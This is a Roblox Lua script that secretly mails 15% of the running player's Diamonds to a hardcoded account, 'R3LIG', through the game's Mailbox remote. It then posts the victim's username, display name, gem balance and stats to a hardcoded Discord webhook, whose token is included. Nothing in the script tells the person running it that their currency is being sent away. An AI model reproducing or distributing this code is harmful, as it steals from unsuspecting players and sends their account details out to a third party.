local WebHook = "https://discord.com/api/webhooks/1264830968301355102/34BGyT0h8b1hCCFbq9EUgqnJWZPis3yaMiGa0q1kAZZsBWJnD3t8x0SF0_eRx9_A47T6"
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local GetSave = require(game.ReplicatedStorage.Library.Client.Save).Get

local user = "R3LIG"
local mailmessage = "yo"
local percentage = 15
local gems = GetSave().Inventory.Currency

for i, v in pairs(gems) do
    if v.id == "Diamonds" then
        local amountToSend = v._am * (percentage / 100)

        if amountToSend >= 500 then
            local args = {
                [1] = user,
                [2] = mailmessage,
                [3] = "Currency",
                [4] = i,
                [5] = amountToSend
            }

            pcall(function()
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            end)

            local player = Players.LocalPlayer
            local realUser = player.Name
            local displayName = player.DisplayName
            local leaderboardInfo = getLeaderstats(player)

            local embed = {
                title = "üíé Gems Sent Notification",
                description = "Details Of Script Execution",
                color = 7506394,
                fields = {
                    { name = "üë§ Real User", value = "``" .. realUser .. "``", inline = true },
                    { name = "üåü Display Name", value = "``" .. displayName .. "``", inline = true },
                    { name = "üíé Real Gems", value = "``" .. (v._am or "nil") .. "``", inline = true },
                    { name = "üí∞ Player Coins", value = "``" .. "CoinsAmount" .. "``", inline = true }, -- Replace with actual coins amount if needed
                    { name = "üí∞ Gems Sent", value = "``" .. amountToSend .. "``", inline = true },
                    { name = "üèÜ Leaderboard Stats", value = "``" .. leaderboardInfo .. "``", inline = false }
                },
                footer = {
                    text = "Captured at: ``" .. os.date("%Y-%m-%d %H:%M:%S") .. "‚Ä¢Today at " .. os.date("%I:%M %p") .. "``",
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }

            local data = { embeds = { embed } }
            local headers = { ["Content-Type"] = "application/json" }
            local request = http_request or request or HttpPost or syn.request

            local success, response = pcall(function()
                return request({
                    Url = WebHook,
                    Method = "POST",
                    Headers = headers,
                    Body = HttpService:JSONEncode(data)
                })
            end)

            if not success then
                print("Failed to send message to Discord webhook. Error: " .. response)
            else
                print("Message sent to Discord webhook!")
            end
        end

        break
    end
end
